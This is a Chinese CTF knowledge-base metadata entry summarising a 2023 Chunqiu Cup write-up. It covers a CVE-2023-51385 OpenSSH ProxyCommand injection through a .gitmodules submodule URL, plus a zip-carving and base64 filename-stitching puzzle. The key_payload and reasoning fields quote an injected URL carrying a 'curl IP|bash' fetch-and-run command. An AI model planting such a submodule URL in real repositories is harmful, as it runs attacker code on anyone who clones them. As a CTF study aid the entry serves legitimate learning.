# 逆向题：【WP】2023年春秋杯冬季赛 misc、reverse、crypto 类题目解析

> 来源：Des-CTF 知识库（结构化 meta，**纯文本**，无样本代码）
> 大赛：春秋杯 2023 ｜ 难度：medium

```yaml
title: 【WP】2023年春秋杯冬季赛 misc、reverse、crypto 类题目解析
contest: 春秋杯
year: 2023
difficulty: medium
vuln_type: misc_unknown
tags:
- CVE-2023-51385
- OpenSSH-ProxyCommand
- git-submodule
- .gitmodules-url-injection
- base64-filename-stitch
- foremost-file-carve
- who-stole-my-takeout
attack_chain: 1. modules CVE-2023-51385 OpenSSH ProxyCommand 注入 + .gitmodules url 包含 ssh://`命令`foo.ichunqiu.com/bar/2. who-stole-my-takeout 外卖箱.zip foremost 分离 + 文件名用户X_XXXX= 的外卖 base64 拼 + - 替换为 / / 3. 排序按用户编号拼接 base64
key_payload: .gitmodules url = ssh://`curl IP|bash`foo.ichunqiu.com/bar  filename regex = 用户(\d+)_([\w+-=]{4})的外卖
one_liner: 2023 春秋杯冬季赛 Misc/Reverse/Crypto WP，CVE-2023-51385 OpenSSH ProxyCommand 注入 + 外卖文件名 base64 拼图。
lesson: CVE-2023-51385 OpenSSH ProxyCommand %h 未过滤反引号执行命令；.gitmodules url 字段是 git clone 触发 RCE 入口；中文压缩包文件名 cp437→gbk 解码是中文文件名处理技巧。
quality: high
full_path: 【WP】2023年春秋杯冬季赛misc、reverse、crypto类题目解析.full.md
meta_path: 【WP】2023年春秋杯冬季赛misc、reverse、crypto类题目解析.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【WP】2023年春秋杯冬季赛 misc、reverse、crypto 类题目解析。2023 春秋杯冬季赛 Misc/Reverse/Crypto WP，CVE-2023-51385 OpenSSH ProxyCommand 注入 + 外卖文件名 base64 拼图。。经验：CVE-2023-51385 OpenSSH ProxyCommand %h 未过滤反引号执行命令；.gitmodul...
category: misc
subcategory: misc_other
tools_used:
- curl
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/159740.html
reasoning_chain:
- modules：CVE-2023-51385 OpenSSH ProxyCommand 注入 → ~/.ssh/config 配置 %h 未过滤反引号
- 假设：构造 ssh://`curl IP|bash`foo.ichunqiu.com/bar → git clone --recurse-submodules 触发
- 写 .gitmodules url = ssh://`命令`foo.ichunqiu.com/bar → 动作：修改现成 git 项目
- who-stole-my-takeout：外卖箱.zip foremost 分离 → cp437→gbk 中文文件名
- 文件名正则 用户(\d+)_([\w+-=]{4})的外卖 → base64 拼 → 排序 → 解密得 flag
failed_attempts:
- 试图直接 git clone 自己的 → .gitmodules 需 modules 文件夹
- 试图 SSH 命令无空格 → %h 不允许空格
- 试图普通文件名处理 → 中文需 cp437→gbk
key_observations:
- CVE-2023-51385 ProxyCommand %h 未过滤反引号执行命令
- .gitmodules url 字段是 git clone 触发 RCE 入口
- 中文压缩包文件名 cp437→gbk 解码是中文文件处理技巧
- 文件名 base64 拼接 + 排序是 misc 经典拼图
prerequisites:
- OpenSSH ProxyCommand 配置语法
- .gitmodules 文件结构 + git submodule 机制
- foremost 文件分离
- Python 编码（cp437/gbk）
```
